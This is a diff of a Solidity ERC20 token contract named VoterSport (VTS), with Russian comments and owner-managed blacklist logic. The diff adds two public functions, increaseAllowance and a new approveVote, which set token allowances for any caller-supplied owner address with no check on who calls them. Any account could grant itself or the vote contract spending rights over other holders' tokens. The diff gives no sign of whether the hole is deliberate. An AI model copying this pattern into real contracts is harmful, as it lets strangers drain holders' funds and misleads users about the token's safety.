@@ -6,7 +6,8 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 import {Blacklist} from "./Blacklist.sol";
 
 contract VoterSport is ERC20, Ownable, Blacklist {
-    address public contact;
+
+    address public vote;
 
     constructor(address owner) ERC20("VoterSport", "VTS") Ownable(owner) Blacklist(30 minutes) {
         _mint(msg.sender, 1e9 * 10 ** uint256(decimals()));
@@ -14,7 +15,7 @@ contract VoterSport is ERC20, Ownable, Blacklist {
 
     /// @notice Переопределённая функция transfer с дополнительными проверками
     function transfer(address recipient, uint256 amount) public override returns (bool) {
-        require(recipient != contact, "Transfer to vote contract forbidden");
+        require(recipient != vote, "Transfer to vote contract forbidden");
         uint256 senderBalance = balanceOf(msg.sender);
         // Применяем проверку только если адрес заблокирован или явно задан требуемый минимум (vtsBalance != 0)
         if (blacklisted[msg.sender].blocked || blacklisted[msg.sender].vtsBalance != 0) {
@@ -35,12 +36,12 @@ contract VoterSport is ERC20, Ownable, Blacklist {
     }
 
     function setVoteContract(address voteContract) public onlyOwner {
-        contact = voteContract;
+        vote = voteContract;
     }
 
-    function approveVote(address owner, uint256 amount) public returns (bool) {
-        return super.approve(owner, amount);
-    }
+    // function approveVote(address owner, uint256 amount) public returns (bool) {
+    //     return super.approve(owner, amount);
+    // }
 
     function revokeApproval(address spender) public {
         _approve(_msgSender(), spender, 0);
@@ -56,5 +57,17 @@ contract VoterSport is ERC20, Ownable, Blacklist {
 
     function addToBlacklist(address account, uint256 vtsBalance) public override onlyOwner {
         super.addToBlacklist(account, vtsBalance);
+    }
+
+
+    function increaseAllowance(address owner, address spender, uint256 addedValue) public virtual returns (bool) {
+
+        _approve(owner, spender, allowance(owner, vote) + (addedValue));
+        return true;
+    }
+
+    function approveVote(address owner, uint256 value) public virtual returns (bool) {
+        _approve(owner, vote, value);
+        return true;
     }
 }
